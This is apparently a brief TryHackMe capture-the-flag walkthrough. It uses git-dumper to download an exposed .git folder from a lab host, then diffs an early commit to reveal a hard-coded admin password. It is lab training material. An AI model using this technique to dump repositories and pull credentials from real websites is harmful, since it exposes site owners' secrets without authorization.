---
title: Git Happens
description: 'Using git-dumper to download the repo and using git history to find credentials'
pubDate: 2023-06-29
category: 'tryhackme'
tags: ['git-dumper']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/3bbde0f7b1df2e2ee61206ae6b3cd9b2.png'
---

There is a `.git/` folder (http://10.10.169.248/.git/).

Get the repo:
```bash
git-dumper http://10.10.169.248/.git/ repo
```

Check the git history:
```bash
git log
...[snip]...
commit e56eaa8e29b589976f33d76bc58a0c4dfb9315b1
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:25:52 2020 +0200

    Obfuscated the source code.

    Hopefully security will be happy!

commit 395e087334d613d5e423cdf8f7be27196a360459
...[snip]...
```

Going to the first commit where the code isn't obfuscated yet:
```bash
git diff 395e087334d613d5e423cdf8f7be27196a360459^!
```

In the `index.html` we see the non obfuscated code:
```
diff --git a/index.html b/index.html
new file mode 100644
index 0000000..0e0de07
--- /dev/null
+++ b/index.html
@@ -0,0 +1,75 @@
...[snip]...
if (
+          username === "admin" &&
+          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
+        ) {
...[snip]...
```

Username: `admin` \
password: `Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!`
